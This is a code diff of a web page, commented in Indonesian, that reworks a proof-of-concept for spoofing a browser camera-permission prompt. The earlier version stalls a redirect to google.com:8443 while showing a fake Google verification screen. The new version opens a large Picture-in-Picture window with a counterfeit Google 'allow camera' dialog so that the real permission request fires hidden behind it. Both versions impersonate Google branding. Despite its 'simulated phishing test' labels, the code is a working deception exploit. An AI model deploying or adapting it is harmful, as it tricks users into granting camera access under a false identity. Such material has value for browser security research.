@@ -19,7 +19,7 @@
 
 <div class="panel" id="main-card">
   <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443) dan diminta mengizinkan kamera.</p>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diminta mengizinkan kamera.</p>
   <button id="startBtn">Verify Account & Allow Camera</button>
   <div id="status">[*] Ready...</div>
 </div>
@@ -33,81 +33,147 @@
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[Delay 30s] " + msg);
+    console.log("[PiP Overlay] " + msg);
   }
 
   // ============================================
   // 1. TRIGGER (KLIK)
   // ============================================
-  btn.addEventListener('click', function() {
-    log("[*] Memulai delay spoofing 30 detik...");
+  btn.addEventListener('click', async function() {
+    log("[*] Membuka PiP overlay...");
 
-    // ============================================
-    // 2. REDIRECT KE GOOGLE:8443 (PENDING NAVIGATION)
-    // ============================================
-    // Port 8443 tertutup, koneksi menggantung hingga timeout (~30 detik).
     try {
-      window.location.href = "https://www.google.com:8443";
-    } catch (e) {
-      log("[-] Redirect error: " + e.message);
-    }
+      if (!window.documentPictureInPicture) {
+        alert("Document Picture-in-Picture tidak didukung.");
+        return;
+      }
 
-    // ============================================
-    // 3. SELAMA DELAY 30 DETIK, TAMPILKAN UI PALSU + MINTA IZIN KAMERA
-    // ============================================
-    setTimeout(function() {
-      log("[*] Meminta Izin Kamera (saat pending navigation)...");
-      
-      // A. Tampilkan UI palsu
-      document.body.innerHTML = `
-        <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
-          <div style="font-size:32px;font-weight:bold;color:#4285f4;margin-bottom:20px;">G</div>
-          <h2 style="color:#333;margin-bottom:10px;">Google Security Verification</h2>
-          <p style="color:#666;font-size:14px;margin-bottom:20px;">Silakan izinkan kamera untuk melanjutkan verifikasi.</p>
-          <button id="spoofLogin" style="width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:bold;cursor:pointer;">Izinkan Kamera</button>
-          <div style="margin-top:15px;font-size:11px;color:#f00;">This is a simulated phishing test. Do not enter real credentials.</div>
-        </div>
-      `;
-
-      // B. Minta izin kamera
-      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        .then(function(stream) {
-          log("[+] Kamera DIIZINKAN!");
-          stream.getTracks().forEach(function(t) { t.stop(); });
-          
-          document.body.innerHTML = `
-            <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
-              <h2 style="color:#34a853;">✅ Verifikasi Berhasil</h2>
-              <p style="color:#666;">Kamera telah diizinkan. Anda akan diarahkan ke Google.</p>
-            </div>
-          `;
-          
-          setTimeout(function() {
-            window.location.replace('https://www.google.com');
-          }, 2000);
-        })
-        .catch(function(err) {
-          log("[-] Kamera ditolak: " + err.name);
-          setTimeout(function() {
-            window.location.replace('https://www.google.com');
-          }, 1000);
-        });
-
-      // C. Tangkap klik tombol palsu
-      document.getElementById('spoofLogin').addEventListener('click', function() {
-        log("[!] User clicked FAKE Allow button.");
+      // ============================================
+      // 2. BUKA PiP (UKURAN BESAR UNTUK MENUTUPI PROMPT)
+      // ============================================
+      const pipWindow = await documentPictureInPicture.requestWindow({
+        width: 600,
+        height: 500
       });
 
-    }, 1000); // 1 detik setelah redirect (saat pending)
+      log('PiP Window Opened. Size: ' + pipWindow.innerWidth + 'x' + pipWindow.innerHeight);
 
-    // ============================================
-    // 4. SETELAH 30 DETIK, REDIRECT KE GOOGLE ASLI
-    // ============================================
-    setTimeout(function() {
-      log("[*] 30 detik berlalu. Redirect ke Google asli...");
-      window.location.replace('https://www.google.com');
-    }, 30000); // 30 detik
+      // ============================================
+      // 3. TULIS KONTEN PiP (OVERLAY PALSU)
+      // ============================================
+      pipWindow.document.open();
+      pipWindow.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <meta charset="UTF-8">
+          <title>Google Security Verification</title>
+          <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body {
+              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+              background: #fff;
+              display: flex;
+              flex-direction: column;
+              justify-content: center;
+              align-items: center;
+              min-height: 100vh;
+              padding: 20px;
+              text-align: center;
+              overflow: hidden;
+            }
+            .g-logo {
+              font-size: 48px;
+              font-weight: bold;
+              color: #4285f4;
+              margin-bottom: 20px;
+            }
+            h3 { font-size: 24px; color: #333; margin-bottom: 10px; }
+            p { font-size: 14px; color: #666; margin-bottom: 30px; }
+            .fake-prompt {
+              background: #fff;
+              border: 1px solid #ddd;
+              border-radius: 12px;
+              padding: 25px;
+              box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+              text-align: center;
+              max-width: 350px;
+              width: 100%;
+            }
+            .fake-prompt h4 { font-size: 18px; color: #333; margin-bottom: 10px; }
+            .fake-prompt p { font-size: 13px; color: #666; margin-bottom: 20px; }
+            .fake-prompt button {
+              padding: 12px 24px;
+              margin: 5px;
+              border: none;
+              border-radius: 6px;
+              font-size: 14px;
+              font-weight: bold;
+              cursor: pointer;
+            }
+            .fake-prompt .allow { background: #1a73e8; color: #fff; }
+            .fake-prompt .block { background: #f0f0f0; color: #333; }
+            .footer {
+              margin-top: 20px;
+              font-size: 11px;
+              color: #999;
+            }
+          </style>
+        </head>
+        <body>
+          <div class="g-logo">G</div>
+          <h3>Google Security Verification</h3>
+          <p>Please allow camera access to continue.</p>
 
+          <div class="fake-prompt">
+            <h4>accounts.google.com ingin menggunakan kamera Anda</h4>
+            <p>This is a simulated permission prompt.</p>
+            <button class="block" id="fakeBlock">Blokir</button>
+            <button class="allow" id="fakeAllow">Izinkan</button>
+          </div>
+
+          <div class="footer">This is a simulated phishing test. Do not enter real credentials.</div>
+
+          <script>
+            (function() {
+              // Event listener untuk tombol palsu
+              document.getElementById('fakeAllow').addEventListener('click', function() {
+                // Redirect ke Google asli (kesan resmi)
+                window.location.href = 'https://www.google.com';
+              });
+
+              document.getElementById('fakeBlock').addEventListener('click', function() {
+                // Tutup PiP
+                window.close();
+              });
+            })();
+          <\/script>
+        </body>
+        </html>
+      `);
+      pipWindow.document.close();
+
+      log('PiP Overlay ready.');
+
+      // ============================================
+      // 4. TRIGGER PROMPT KAMERA ASLI (DI BELAKANG PiP)
+      // ============================================
+      setTimeout(function() {
+        log("[*] Meminta Izin Kamera (di belakang PiP)...");
+        
+        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+          .then(function(stream) {
+            log("[+] Kamera DIIZINKAN!");
+            stream.getTracks().forEach(function(t) { t.stop(); });
+          })
+          .catch(function(err) {
+            log("[-] Kamera ditolak: " + err.name);
+          });
+      }, 500);
+
+    } catch (e) {
+      log('Error: ' + e.message);
+    }
   }, { once: true });
 
 })();
